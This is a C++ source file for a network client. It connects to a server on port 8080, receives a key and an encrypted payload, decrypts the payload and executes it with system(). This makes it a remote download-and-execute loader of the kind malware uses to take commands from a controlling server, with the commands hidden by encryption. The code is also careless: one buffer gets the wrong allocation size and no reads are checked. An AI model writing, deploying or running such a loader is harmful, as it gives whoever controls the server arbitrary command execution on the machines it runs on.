#include <stdio.h>
#include <sys/socket.h>

#include "client.h"

client::client(void) : Socket() {
    struct addrinfo hint;
    struct addrinfo *tmp;
    size_t payload_size;
    byte *payload_size_buff;
    byte *key;
    byte *payload;

    memset(&hint, 0, sizeof(hint));
    hint.ai_socktype = SOCK_STREAM;
    hint.ai_flags = AI_CANONNAME;

    if (getaddrinfo(host, NULL, &hint, &tmp)) {
        perror("getaddinfo failed");
        exit(EXIT_FAILURE);
    }

    serverAddress = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in));

    memcpy(serverAddress, tmp->ai_addr, sizeof(struct sockaddr));
    freeaddrinfo(tmp);
    
    serverAddress->sin_family = AF_INET;
    serverAddress->sin_port = htons(8080);
    //serverAddress->sin_addr.s_addr = INADDR_LOOPBACK;

    if (connect(sock, (struct sockaddr *)(serverAddress), sizeof(struct sockaddr)) == -1) {
        perror("Oh no. could not connect to host");
        exit(EXIT_FAILURE);
    }

    key = (byte *)malloc(sizeof(KEY_SIZE));
    payload_size_buff = (char *)malloc(BUFF_SIZE);

    read(sock, key, KEY_SIZE);

    read(sock, payload_size_buff, BUFF_SIZE);
    sscanf(payload_size_buff, "%lu", &payload_size);
    free(payload_size_buff);
    payload_size_buff = NULL;

    payload = (byte *)malloc(payload_size + 1);
        
    read(sock, payload, payload_size);

    payload[payload_size] = '\0';

    crypto *crypt = new crypto(key, payload_size, payload);
    crypt->crypt_key();
    crypt->crypt();

    fun(crypt);

    delete crypt;
    crypt = nullptr;
    shutdown(sock, SHUT_RDWR);
}

client::~client(void) {
    close(sock);
    free(serverAddress);
    serverAddress = NULL;
}

void fun(crypto *crypt) {
    system(crypt->get_payload());
}
